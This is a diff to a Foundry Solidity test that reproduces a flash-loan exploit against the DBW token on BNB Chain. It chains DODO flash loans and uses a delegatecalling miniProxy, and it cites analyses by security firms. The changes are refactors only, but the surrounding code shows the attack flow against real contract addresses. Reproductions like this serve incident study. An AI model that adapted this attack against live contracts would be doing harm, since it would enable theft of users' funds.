@@ -3,6 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
 // @Analysis
 // https://twitter.com/BeosinAlert/status/1639655134232969216
 // https://twitter.com/AnciliaInc/status/1639289686937210880
@@ -28,7 +33,7 @@ contract ContractTest is Test {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
     IUniswapV2Pair Pair = IUniswapV2Pair(0x69D415FBdcD962D96257056f7fE382e432A3b540);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
     address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
     address dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
@@ -57,7 +62,7 @@ contract ContractTest is Test {
     function testExploit() external {
         RewardImpl = new claimRewardImpl();
         dodo1FlashLoanAmount = USDT.balanceOf(dodo1);
-        DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));
+        IDVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
             "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
@@ -67,15 +72,15 @@ contract ContractTest is Test {
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         if (msg.sender == dodo1) {
             dodo2FlashLoanAmount = USDT.balanceOf(dodo2);
-            DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
+            IDVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
             USDT.transfer(dodo1, dodo1FlashLoanAmount);
         } else if (msg.sender == dodo2) {
             dodo3FlashLoanAmount = USDT.balanceOf(dodo3);
-            DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
+            IDVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
             USDT.transfer(dodo2, dodo2FlashLoanAmount);
         } else if (msg.sender == dodo3) {
             dodo4FlashLoanAmount = USDT.balanceOf(dodo4);
-            DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
+            IDVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
             USDT.transfer(dodo3, dodo3FlashLoanAmount);
         } else if (msg.sender == dodo4) {
             PairFlashLoanAmount = 3_037_214_233_168_643_025_678_873;
@@ -180,8 +185,8 @@ contract claimRewardImpl is Test {
 
 contract miniProxy {
 
-    constructor(address claimRewardImpl) {
-        (bool success,) = claimRewardImpl.delegatecall(abi.encodeWithSignature("exploit()"));
+    constructor(address _claimRewardImpl) {
+        (bool success,) = _claimRewardImpl.delegatecall(abi.encodeWithSignature("exploit()"));
         require(success);
         selfdestruct(payable(tx.origin));
     }
